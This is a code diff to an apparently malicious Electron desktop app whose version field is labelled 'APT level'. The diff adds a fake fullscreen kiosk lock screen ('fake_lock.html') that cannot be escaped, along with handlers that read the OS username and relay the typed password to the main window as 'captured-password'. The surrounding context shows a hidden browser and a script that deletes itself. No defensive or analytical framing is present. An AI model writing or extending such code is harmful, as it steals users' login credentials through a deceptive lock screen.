@@ -108,8 +108,8 @@ app.whenReady().then(() => {
 
     ipcMain.handle('get-version', () => {
         return {
-            appVersion: "1.0.11",
-            aptVersion: "apt-14" // Current APT level
+            appVersion: "1.0.12",
+            aptVersion: "apt-15" // Current APT level
         };
     });
 
@@ -737,6 +737,43 @@ objFSO.DeleteFile WScript.ScriptFullName
             await hiddenBrowser.close().catch(()=>{});
             hiddenBrowser = null;
             hiddenClient = null;
+        }
+    });
+
+    ipcMain.handle('get-username', () => {
+        return os.userInfo().username;
+    });
+
+    let lockScreenWindow = null;
+
+    ipcMain.handle('show-fake-lockscreen', () => {
+        if (lockScreenWindow) return;
+        lockScreenWindow = new BrowserWindow({
+            fullscreen: true,
+            kiosk: true,
+            alwaysOnTop: true,
+            skipTaskbar: true,
+            frame: false,
+            webPreferences: {
+                nodeIntegration: false,
+                contextIsolation: true,
+                preload: path.join(__dirname, 'preload_lock.js')
+            }
+        });
+        lockScreenWindow.loadFile('fake_lock.html');
+        
+        lockScreenWindow.on('closed', () => {
+            lockScreenWindow = null;
+        });
+    });
+
+    ipcMain.handle('submit-fake-password', (event, pwd) => {
+        if (lockScreenWindow) {
+            lockScreenWindow.close();
+            lockScreenWindow = null;
+        }
+        if (mainWindow) {
+            mainWindow.webContents.send('captured-password', pwd);
         }
     });
 
